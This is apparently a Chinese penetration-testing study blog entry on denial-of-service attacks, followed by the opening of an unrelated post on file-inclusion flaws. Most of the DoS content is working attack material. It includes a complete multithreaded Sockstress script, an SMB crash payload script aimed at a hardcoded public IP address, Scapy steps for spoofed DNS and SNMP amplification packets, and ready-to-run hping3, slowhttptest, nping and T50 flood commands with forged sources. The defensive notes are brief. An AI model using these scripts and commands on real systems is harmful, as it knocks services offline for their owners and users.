<h4 id="拒绝服务——Smurf攻击"><a href="#拒绝服务——Smurf攻击" class="headerlink" title="拒绝服务——Smurf攻击"></a>拒绝服务——Smurf攻击</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>向广播地址发送伪造源地址的 ICMP echo Request （ping）包</li>
<li>LAN 所有计算机向伪造源地址返回响应包</li>
<li>对现代操作系统几乎无效（不响应目标为广播的ping）</li>
</ul>
<h5 id="2-测试攻击"><a href="#2-测试攻击" class="headerlink" title="2.测试攻击"></a>2.测试攻击</h5><pre><code>&gt;&gt;&gt; i=IP()
&gt;&gt;&gt; i.display()</code></pre><p><img src="G91A6l1.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; i.src=&quot;10.10.10.132&quot;
&gt;&gt;&gt; i.dst=&quot;10.10.10.255&quot;</code></pre><p><img src="PjqvNVP.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; p=ICMP()
&gt;&gt;&gt; p.display()</code></pre><p><img src="Zr6n0yF.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; r=send(i/p)</code></pre><p><img src="mdv0dml.png" alt="img"></p>
<pre><code># 使用一行发送：
send(IP(dst=&quot;10.10.10.255&quot;,src=&quot;10.10.10.132&quot;)/ICMP(),count=100,verbose=1</code></pre><h3 id="拒绝服务–Sockstress-攻击"><a href="#拒绝服务–Sockstress-攻击" class="headerlink" title="拒绝服务–Sockstress 攻击"></a>拒绝服务–Sockstress 攻击</h3><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>2008年由Jack C.Louis 发现</li>
<li>针对TCP服务的拒绝服务攻击<ul>
<li>消耗被攻击目标系统资源</li>
<li>与攻击目标建立大量socket链接</li>
<li>完成三次握手，最后的ACK包window 大小为0 (客户端不接收数据)</li>
<li>攻击者资源消耗小(CPU、内存、带宽)</li>
<li>异步攻击，单机可拒绝服务高配资源服务器</li>
<li>Window 窗口实现的TCP 流控</li>
</ul>
</li>
</ul>
<h4 id="2-脚本攻击-1"><a href="#2-脚本攻击-1" class="headerlink" title="2.脚本攻击"></a>2.脚本攻击</h4><h5 id="1-python测试脚本"><a href="#1-python测试脚本" class="headerlink" title="1.python测试脚本"></a>1.python测试脚本</h5><pre><code>#!/usr/bin/python
#coding=utf-8

from scapy.all import*
from time import sleep
import thread
import random
import logging
import os
import signal
import sys
import signal

logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print &quot;用法: ./sockstress.py [IP地址] [端口] [线程数]&quot;
    print &quot;举例: ../sockstress.py  1.1.1.1 80 20 # 请确定被攻击端口处于开放状态&quot;
    sys.exit()

target = str(sys.argv[1])
dstport= int(sys.argv[2])
threads = int(sys.argv[3])

## 攻击函数
def sockstress(target,dstport) :
    while 0 == 0:
        try:
            x = random.randint(0,65535)
            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags = &#39;S&#39;),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,lags=&#39;A&#39;,ack=(response[TCP].seq + 1) )/&#39;\x00\x00&#39;,verbose=0)
        except:
            pass

## 停止攻击函数
def shutdown(signal,frame):
    print &quot;正在修复 iptables 规则&quot;
    os.system(&#39;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d &#39;+ target +&#39; -j DROP&#39;)
    sys.exit()

## 添加iptables规则
os.system(&#39;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d &#39;+ target +&#39; -j DROP&#39;)
signal.signal(signal.SIGINT, shutdown)

## 多线程攻击
print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;
for x in range(0,threads):
    thread.start_new_thread(sockstress, (target,dstport))

##永远执行
while 0 == 0:
    sleep(1)</code></pre><ul>
<li><p>测试结果</p>
<pre><code># 查看系统连接数
netstat | grep ESTABLISHED | wc -l</code></pre></li>
</ul>
<p><img src="zdOuFdq.png" alt="img"></p>
<h5 id="2-C攻击脚本"><a href="#2-C攻击脚本" class="headerlink" title="2.C攻击脚本"></a>2.C攻击脚本</h5><ul>
<li>下载编译</li>
</ul>
<p><a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">github 下载地址</a></p>
<pre><code>gcc -Wall -c sockstress.c
gcc -pthread -o sockstress sockstress.o
./sockstress 10.10.10.132:80 eth0
./sockstress 10.10.10.132:80 eth0 -p payloads/http

防火墙规则
iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 10.10.10.132 -j DROP</code></pre><ul>
<li><p>查看攻击效果</p>
<pre><code>netstat -tulnp | grep ESTABLISHED | wc -l
free
top</code></pre></li>
</ul>
<h4 id="3-防御措施"><a href="#3-防御措施" class="headerlink" title="3.防御措施"></a>3.防御措施</h4><ul>
<li>直到今天sockstress攻击仍然是一种很有效的DOS攻击方式</li>
<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效</li>
<li>根本的防御方法是采用白名单(不实际)</li>
<li>折中对策限制单位时间内每IP建的TCP连接数<ul>
<li>封杀每30秒与 80 端口建立连接超过 10 个的IP地址</li>
<li>iptables -I INPUT -p tcp –dport 80 -m state–state NEW -m recent–set</li>
<li>iptables -I INPUT-p tcp -dport 80 -m state-state NEW-m recent -update–seconds 30 -hitcount 10 j DROP</li>
<li>以上规则对DDOS攻击无效</li>
</ul>
</li>
</ul>
<h3 id="拒绝服务–TearDrop-攻击"><a href="#拒绝服务–TearDrop-攻击" class="headerlink" title="拒绝服务–TearDrop 攻击"></a>拒绝服务–TearDrop 攻击</h3><h4 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>主要针对早期微软操作系统（95、98、3.x、nt）<ul>
<li>近些年有人发现对 2.x 版本的安卓系统、6.0 IOS 系统攻击有效</li>
</ul>
</li>
<li>原理很有趣<ul>
<li>使用 IP 分段便宜实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li>
</ul>
</li>
<li>攻击效果<ul>
<li>被攻击者蓝屏、重启、卡死</li>
</ul>
</li>
</ul>
<p><img src="w9pzlfZ.png" alt="img"></p>
<ul>
<li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
<li>针对早期windows系统SMB协议的攻击<ul>
<li>teardrop_smb.py</li>
</ul>
</li>
<li>针对Android.IOS 系统的攻击<ul>
<li>teardrop_androidios.py</li>
</ul>
</li>
<li>攻击向量并不确定，要视具体协议分析</li>
</ul>
<h4 id="2-攻击目标"><a href="#2-攻击目标" class="headerlink" title="2.攻击目标"></a>2.攻击目标</h4><p>泪滴攻击是一种拒绝服务（DoS）攻击，涉及将碎片数据包发送到目标机器。由于接收这些数据包的机器由于TCP / IP碎片重组错误而无法重新组装，因此数据包相互重叠，导致目标网络设备崩溃。这通常发生在较早的操作系统上，例如Windows 3.1x，Windows 95，Windows NT和2.1.63之前版本的Linux内核。</p>
<p>IP报头中的一个字段是“片段偏移量”字段，指示包含在分段数据包中的数据相对于原始数据包中的数据的起始位置或偏移量。如果一个分片数据包的偏移量和大小之和不同于下一个分片数据包的偏移量和大小之和，则数据包重叠。发生这种情况时，易受泪滴攻击的服务器无法重新组装数据包 - 从而导致拒绝服务状况。</p>
<h4 id="3-攻击脚本"><a href="#3-攻击脚本" class="headerlink" title="3.攻击脚本"></a>3.攻击脚本</h4><pre><code>#!/usr/bin/python
# When SMB2.0 recieve a &quot;&amp;&quot; char in the &quot;Process Id High&quot;
# SMB header field it dies with a
# PAGE_FAULT_IN_NONPAGED_AREA
# filename: teardrop-attack-smb.py

import sys
from socket import socket
from time import sleep

#host = sys.argv[1], 445
#host = &quot;192.168.33.13&quot;, 445
host = &quot;217.113.205.53&quot;, 445
buff = (
&quot;\x00\x00\x00\x90&quot; # Begin SMB header: Session message
&quot;\xff\x53\x4d\x42&quot; # Server Component: SMB
&quot;\x72\x00\x00\x00&quot; # Negociate Protocol
&quot;\x00\x18\x53\xc8&quot; # Operation 0x18 &amp; sub 0xc853
&quot;\x00\x26&quot;# Process ID High: --&gt; :) normal value should be &quot;\x00\x00&quot;
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe&quot;
&quot;\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54&quot;
&quot;\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31&quot;
&quot;\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00&quot;
&quot;\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57&quot;
&quot;\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61&quot;
&quot;\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c&quot;
&quot;\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c&quot;
&quot;\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e&quot;
&quot;\x30\x30\x32\x00&quot;
)
s = socket()
s.connect(host)
s.send(buff)
s.close()</code></pre><h4 id="拒绝服务–DNS-放大攻击"><a href="#拒绝服务–DNS-放大攻击" class="headerlink" title="拒绝服务–DNS 放大攻击"></a>拒绝服务–DNS 放大攻击</h4><h4 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>产生大流量的攻击方法<ul>
<li>单机的带宽优势</li>
<li>巨大单机数量形成的流量汇聚</li>
<li>利用协议特性实现放大效果的流量</li>
</ul>
</li>
<li>DNS协议放大效果<ul>
<li>查询请求流量小，但响应流量可能非常巨大</li>
<li>dig ANY hp.com @202 106.0.20 (流量放大约8倍)</li>
</ul>
</li>
<li>攻击原理<ul>
<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDOS</li>
</ul>
</li>
</ul>
<h4 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h4><pre><code>root@kali:~# dig any baidu.com @114.114.114.114</code></pre><p>发送60字节长度，返回216字节长度</p>
<p><img src="GqPGP9F.png" alt="img"></p>
<h4 id="3-Scapy构造攻击数据包原理"><a href="#3-Scapy构造攻击数据包原理" class="headerlink" title="3.Scapy构造攻击数据包原理"></a>3.Scapy构造攻击数据包原理</h4><ul>
<li>IP/UDP/DNS/DNS 查询内容</li>
</ul>
<p><img src="px5Ihn0.png" alt="img"></p>
<ul>
<li>结合IP地址欺骗，利用大量 DNS 服务器做傀儡攻击目标</li>
</ul>
<h4 id="4-构造数据包过程"><a href="#4-构造数据包过程" class="headerlink" title="4.构造数据包过程"></a>4.构造数据包过程</h4><p>1.构造 IP 数据包</p>
<pre><code>&gt;&gt;&gt; i=IP()
&gt;&gt;&gt; i.display()</code></pre><p><img src="z1OV3Jv.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; i.dst=&quot;114.114.114.114&quot;
&gt;&gt;&gt; i.display()</code></pre><p><img src="3MXZboo.png" alt="img"></p>
<p>2.构造UDP数据包</p>
<pre><code>&gt;&gt;&gt; u=UDP()
&gt;&gt;&gt; u.display()</code></pre><p><img src="14c4SzU.png" alt="img"></p>
<p>3.构造 DNS 数据包</p>
<pre><code>&gt;&gt;&gt; d=DNS()
&gt;&gt;&gt; d.display()</code></pre><p><img src="aZfTrYu.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; d.rd=1
&gt;&gt;&gt; d.qdcount=1
&gt;&gt;&gt; d.display()</code></pre><p><img src="aBZdHNP.png" alt="img"></p>
<p>4.设置查询目标</p>
<pre><code>&gt;&gt;&gt; q=DNSQR()
&gt;&gt;&gt; q.display()</code></pre><p><img src="qcAPHGS.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; q.qname=&#39;qq.com&#39;
&gt;&gt;&gt; q.qtype=255   #（代表any）</code></pre><p><img src="DiDX3Nk.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; d.qd=q   # 设置目标
&gt;&gt;&gt; d.display()</code></pre><p><img src="ucWhz05.png" alt="img"></p>
<p>5.拼接数据包</p>
<pre><code>&gt;&gt;&gt; r=(i/u/d)
&gt;&gt;&gt; r</code></pre><p><img src="BYH2G1x.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; r.display()
&gt;&gt;&gt; sr1(r)</code></pre><p><img src="mjWweAd.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; i.src=&quot;10.10.10.141&quot;
&gt;&gt;&gt; r=(i/u/d)
&gt;&gt;&gt; r.display()</code></pre><p>6.发送数据包</p>
<pre><code>&gt;&gt;&gt; send(r)</code></pre><p>发送 60 字节的数据包，返回 2；l30 字节的数据包</p>
<p><img src="j8EXlRY.png" alt="img"></p>
<h3 id="拒绝服务——SNMP服务"><a href="#拒绝服务——SNMP服务" class="headerlink" title="拒绝服务——SNMP服务"></a>拒绝服务——SNMP服务</h3><h4 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>简单网络管理协议</li>
<li>Simmple Network Management Protocol<ul>
<li>一般用来监控和管理网络设备</li>
</ul>
</li>
<li>服务端口UDP 161/162<ul>
<li>管理站(manager/客户端)、被管理设备(agent/服务端)</li>
<li>管理信息数据库(MIB) 是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
<li>每一个节点都有一个对象标识符(OID) 来唯一的标识一IETF定义便准的MIB库厂家自定义MIB库</li>
</ul>
</li>
<li>攻击原理</li>
<li>请求流量小，查询结果返回流量大<ul>
<li>结合伪造源地址实现攻击</li>
</ul>
</li>
</ul>
<h4 id="2-安装SNMP"><a href="#2-安装SNMP" class="headerlink" title="2.安装SNMP"></a>2.安装SNMP</h4><ul>
<li>安装 SNMP，定义 community</li>
</ul>
<p><img src="okOSYrp.png" alt="img"></p>
<p><img src="TZf6kGU.png" alt="img"></p>
<p><img src="aH8IJJ2.png" alt="img"></p>
<h4 id="3-scapy构造数据包"><a href="#3-scapy构造数据包" class="headerlink" title="3.scapy构造数据包"></a>3.scapy构造数据包</h4><ul>
<li>流程</li>
</ul>
<p><img src="28X1RdW.png" alt="img"></p>
<ul>
<li>步骤</li>
</ul>
<p><strong>构造 IP 数据包</strong></p>
<pre><code>&gt;&gt;&gt; i=IP()
&gt;&gt;&gt; i.dst=&quot;10.10.10.142&quot;
&gt;&gt;&gt; i.display()</code></pre><p><img src="mDZkeVN.png" alt="img"></p>
<p><strong>构造 UDP 数据包</strong></p>
<pre><code>&gt;&gt;&gt; u=UDP()
&gt;&gt;&gt; u.dport=161
&gt;&gt;&gt; u.sport=161</code></pre><p><img src="wq7hyEF.png" alt="img"></p>
<p><strong>构造 SNMP 数据包</strong></p>
<pre><code>&gt;&gt;&gt; s=SNMP()</code></pre><p><img src="LGtwfwK.png" alt="img"></p>
<p><strong>设置放大倍数</strong></p>
<pre><code>&gt;&gt;&gt; b=SNMPbulk()
&gt;&gt;&gt; b.max_repetitions=100
&gt;&gt;&gt; b.varbindlist=[SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.1&#39;)),SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.19.1.3&#39;))]
&gt;&gt;&gt; b.display()</code></pre><p><img src="9Z7Rq86.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; s.display()</code></pre><p><img src="3m6lmhQ.png" alt="img"></p>
<p><strong>设置 SNMP 数据包</strong></p>
<pre><code>&gt;&gt;&gt; s.PDU=b
&gt;&gt;&gt; s.display()</code></pre><p><img src="d0jMjxp.png" alt="img"></p>
<p><strong>合成完整数据包</strong></p>
<pre><code>&gt;&gt;&gt; r=(i/u/s)
&gt;&gt;&gt; r.display()</code></pre><p><strong>发送数据包</strong></p>
<pre><code>&gt;&gt;&gt; sr1(r)</code></pre><p>发送 98 字节，返回 4534 字节的数据包</p>
<p><img src="nJUfGfh.png" alt=""></p>
<p><strong>测试放大200倍效果</strong></p>
<pre><code>&gt;&gt;&gt; b.max_repetitions=200
&gt;&gt;&gt; s.PDU=b
&gt;&gt;&gt; s.display()</code></pre><p><img src="1deTNBV.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; r=(i/u/s)
&gt;&gt;&gt; r.display()
&gt;&gt;&gt; sr1(r)</code></pre><p>发送 99 字节，返回 8894 字节</p>
<p><img src="e2RFmyd.png" alt="img"></p>
<h3 id="拒绝服务——NTP-放大攻击"><a href="#拒绝服务——NTP-放大攻击" class="headerlink" title="拒绝服务——NTP 放大攻击"></a>拒绝服务——NTP 放大攻击</h3><h4 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>网络时间协议<ul>
<li>Network Time Protocol</li>
<li>保证网络设备时间同步</li>
<li>电子设备互相干扰导致时钟差异越来越大</li>
<li>影响应用正常运行、日志审计不可信</li>
<li>服务端口UDP 123</li>
</ul>
</li>
<li>攻击原理<ul>
<li>NTP 服务提monlist (MON_GETLIST) 查询功能<ul>
<li>监控NTP 服务器的状况 </li>
</ul>
</li>
</ul>
</li>
<li>客户端查询时，NTP服务器返回最后同步时间的600 个客户端IP</li>
<li>每6个IP一个数据包，最多100个数据包(放大约100倍)</li>
</ul>
<h4 id="2-扫描NTP服务器"><a href="#2-扫描NTP服务器" class="headerlink" title="2.扫描NTP服务器"></a>2.扫描NTP服务器</h4><p>1.服务器安装 ntp</p>
<pre><code>root@xu:~# apt-get install ntp
root@xu:~# netstat -tulnp | grep 123</code></pre><p>2.kali扫描发现http服务器</p>
<pre><code>root@kali:~# nmap -sU -p 123 10.10.10.0/24 --open
root@kali:~# nmap -sU -p 123 -sV 10.10.10.138</code></pre><p>3.kali 扫描发现漏洞</p>
<pre><code>root@kali:~# ntpdc -n -c monlist 10.10.10.138
10.10.10.138: timed out, nothing received
***Request timed out    # 说明不存在漏洞</code></pre><p>4.配置 ntp 服务器配置</p>
<pre><code>注释 38 和 39行
# restrict -4 default kod notrap nomodify nopeer noquery limited
# restrict -6 default kod notrap nomodify nopeer noquery limited
root@xu:~# /etc/init.d/ntp restart</code></pre><p>5.kali 扫描发现漏洞</p>
<pre><code>root@kali:~# ntpdc -n -c monlist 10.10.10.138
root@kali:~# ntpq -c rv 10.10.10.138
root@kali:~# ntpdc -c sysinfo 10.10.10.138</code></pre><h4 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3.防御策略"></a>3.防御策略</h4><ul>
<li>NTP 攻击策略<ul>
<li>升级到 ntpd 4.2.7p26 及以上版本（默认关闭 monlist 查询）</li>
<li>手动关闭 monlist 查询功能</li>
</ul>
</li>
</ul>
<h3 id="拒绝服务–应用层DoS-攻击"><a href="#拒绝服务–应用层DoS-攻击" class="headerlink" title="拒绝服务–应用层DoS 攻击"></a>拒绝服务–应用层DoS 攻击</h3><ul>
<li>应用服务漏洞<ul>
<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
</ul>
</li>
<li>缓冲区溢出漏洞<ul>
<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
<li>影响: 远程代码执行、DOS</li>
<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
</ul>
</li>
<li>CesarFTP 0.99 服务漏洞<ul>
<li>ftp_fuzz.py # MKD/RMD</li>
</ul>
</li>
<li>MS12-020 远程桌面协议DOS漏洞</li>
</ul>
<h4 id="2-攻击测试-MS12-020"><a href="#2-攻击测试-MS12-020" class="headerlink" title="2. 攻击测试 MS12-020"></a>2. 攻击测试 MS12-020</h4><pre><code>root@kali:~# searchsploit ms12-020
root@kali:~# cp /usr/share/exploitdb/exploits/windows/dos/18606.txt .
root@kali:~# mv 18606.txt  MS12-020.txt
root@kali:~# leafpad MS12-020.txt 
root@kali:~# nc 10.10.10.141 3389 &lt; termdd_1.dat</code></pre><h4 id="3-Slowhttptest"><a href="#3-Slowhttptest" class="headerlink" title="3. Slowhttptest"></a>3. Slowhttptest</h4><ul>
<li><p>Slowhttptest (源自google)</p>
<ul>
<li>低带宽应用层慢速DOS攻击(相对于CC等快速攻击而言的慢速)</li>
<li>最早由Python编写，跨平台支持(Linux、win、Cygwin、OSX)</li>
<li>尤其擅长攻击apache.tomcat (几乎百发百中)</li>
</ul>
</li>
<li><p>攻击方法</p>
<ul>
<li>Apache Range Header attack<ul>
<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
<li>耗尽服务器CPU、内存资源</li>
</ul>
</li>
</ul>
</li>
<li><p>ulimite -n 70000</p>
</li>
<li><p>HTTP Post 攻击模式</p>
<ul>
<li>slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 10 -p 3</li>
</ul>
</li>
<li><p>slowloris 攻击模式</p>
<ul>
<li>slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 24 -p 3</li>
</ul>
</li>
<li><p>支持代理</p>
</li>
<li><p>大量应用服务器和安全设备都无法防护慢速攻击</p>
</li>
</ul>
<p><img src="Zc2XbBy.jpg" alt="img"></p>
<h4 id="4-攻击测试"><a href="#4-攻击测试" class="headerlink" title="4.攻击测试"></a>4.攻击测试</h4><pre><code>root@kali:~# slowhttptest -c 60000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.10.10.132 -x 10 -p 3 -l 999999</code></pre><p><img src="z8Bx42G.png" alt="img"></p>
<p><img src="ptFr6br.png" alt="img"></p>
<pre><code>root@kali:~# slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -s 8192 -t GET -u http://10.10.10.132 -x 10 -p 3</code></pre><p><img src="q8f1NkR.png" alt="img"></p>
<pre><code>root@kali:~# man slowhttptest</code></pre><h3 id="拒绝服务攻击工具"><a href="#拒绝服务攻击工具" class="headerlink" title="拒绝服务攻击工具"></a>拒绝服务攻击工具</h3><h4 id="1-rudy"><a href="#1-rudy" class="headerlink" title="1.rudy"></a>1.rudy</h4><h5 id="1-简介-6"><a href="#1-简介-6" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
<li>每次只传输一个字节的数据、</li>
<li>美剧黑客军团”中曾提到此攻击手段</li>
<li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
<li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li>
</ul>
<h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h5><pre><code>root@kali:~/rudy# ls
BeautifulSoup.py   README          r-u-dead-yet-v2.2.py  socks.pyc
BeautifulSoup.pyc  rudeadyet.conf  socks.py</code></pre><p>修改配置文件</p>
<p><img src="tdPvToI.png" alt="img"></p>
<pre><code>root@kali:~/rudy# ./r-u-dead-yet-v2.2.py</code></pre><p><img src="ilCKVV2.png" alt="img"></p>
<p><img src="eo46mKo.png" alt="img"></p>
<h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><h5 id="1-简介-7"><a href="#1-简介-7" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li><p>几乎可以定制发送任何 TCP/IP 数据包，用于测试 FW、端口扫描、性能测试</p>
</li>
<li><p>syn flood 攻击</p>
<ul>
<li>hping3 -c 1000 -d 120 -S -w 64 -p 80 –flood –rand-source 10.10.10.132</li>
<li>hping3 -S -P -U -p 80 –flood –rand-source 10.10.10.132</li>
<li>hping3 -SARFUP -p 80 –flood –rand-source 10.10.10.132 (TCP Flood)</li>
</ul>
</li>
<li><p>ICMP Flood 攻击</p>
<ul>
<li>hping3 -q -n -a 1.1.1.1 –icmp -d 200 –flood 10.10.10.132</li>
</ul>
</li>
<li><p>UDP Flood 攻击</p>
<ul>
<li>hping3 -a 1.1.1.1 –udp -s 53 -d 100 -p 53 –flood 10.10.10.132</li>
</ul>
</li>
</ul>
<h5 id="2-攻击-1"><a href="#2-攻击-1" class="headerlink" title="2.攻击"></a>2.攻击</h5><ul>
<li><p>syn_flood 攻击</p>
<pre><code>root@kali:~# hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.132</code></pre></li>
</ul>
<p><img src="ptoKirq.png" alt="img"></p>
<pre><code>hping3 -S -P -U -p 80 --flood --rand-source 10.10.10.132</code></pre><p><img src="qykXjba.png" alt="img"></p>
<ul>
<li><p>tcp_flood 攻击</p>
<pre><code>root@kali:~# hping3 -SARFUP -p 80 --flood --rand-source 10.10.10.132</code></pre></li>
</ul>
<p><img src="TX0DsTz.png" alt="img"></p>
<ul>
<li><p>icmp_flood 攻击</p>
<pre><code>-a 伪造源地址
root@kali:~# hping3 -q -n -a 1.1.1.1 --icmp -d 200 --flood 10.10.10.132</code></pre><p><img src="j82vMQQ.png" alt="img"></p>
</li>
<li><p>udp_flood 攻击</p>
<pre><code>root@kali:~# hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 10.10.10.132</code></pre><p><img src="yh6OGJ9.png" alt="img"></p>
</li>
</ul>
<h3 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h3><ul>
<li><p>特殊种类的 SYN Flood 攻击</p>
</li>
<li><p>源地址和目的地址都是靶机IP，受害者和自己完成三次握手</p>
</li>
<li><p>hping3 -n -a 10.10.10.132 -S -d 100 -p 80 –flood 10.10.10.132</p>
<pre><code>root@kali:~# hping3 -n -a 10.10.10.132 -S -d 100 -p 80 --flood 10.10.10.132</code></pre><p><img src="3YN6wrP.png" alt="img"></p>
</li>
</ul>
<h3 id="3-nping"><a href="#3-nping" class="headerlink" title="3.nping"></a>3.nping</h3><ul>
<li><p>TCP 全连接 DoS 攻击</p>
<ul>
<li>nping –tcp-connect –rate=10000 -c 1000000000 -q 10.10.10.132</li>
</ul>
</li>
<li><p>查公网 IP</p>
<ul>
<li>nping –echo-client “public” echo.nmap.org –udp</li>
</ul>
</li>
</ul>
<h3 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h3><ul>
<li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p>
</li>
<li><p>siege -g <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a></p>
</li>
<li><p>siege -i -c 1000 <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -A siegehttp</p>
</li>
<li><p>同时攻击多个 url ，使用 -f 调用字典文件</p>
</li>
<li><p>单独使用 siege -i -c 1000 ，也会调用字典文件（url 列表）</p>
<ul>
<li><p>/etc/siege/urls.txt</p>
<pre><code># 查看 banner 信息
root@kali:~# siege -g http://10.10.10.132</code></pre></li>
</ul>
</li>
</ul>
<p><img src="Seky1di.png" alt="img"></p>
<pre><code>root@kali:~# siege -i -c 1000 http://10.10.10.132 -A Mozilla/5.0</code></pre><p><img src="8d3o6st.png" alt="img"></p>
<pre><code>root@kali:~# cat /etc/siege/urls.txt</code></pre><p><img src="ccML8at.png" alt="img"></p>
<pre><code>root@kali:~# siege -i -c 1000</code></pre><p><img src="FdDymAj.png" alt="img"></p>
<h3 id="5-T50"><a href="#5-T50" class="headerlink" title="5.T50"></a>5.T50</h3><ul>
<li><p>网络压力测试</p>
<ul>
<li><p>t50 10.10.10.132 –flood –turbo -S –protocol TCP –dport 80</p>
</li>
<li><p>t50 10.10.10.132 –flood –turbo -S TCP UDP OSPF EIGRP –dport 22</p>
<pre><code>root@kali:~# t50 10.10.10.132 --flood --turbo -S --protocol TCP --dport 80</code></pre></li>
</ul>
</li>
</ul>
<p><img src="NzK2wiZ.png" alt="img"></p>
<p><img src="wJiBiqD.png" alt="img"></p>
<h4 id="6-NMAP"><a href="#6-NMAP" class="headerlink" title="6.NMAP"></a>6.NMAP</h4><pre><code>root@kali:~# grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2
broadcast-avahi-dos.nse
http-slowloris.nse
ipv6-ra-flood.nse
smb-flood.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-regsvc-dos.nse</code></pre>]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>拒绝服务</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞学习笔记</title>
    <url>/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/</url>
    <content><![CDATA[<h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
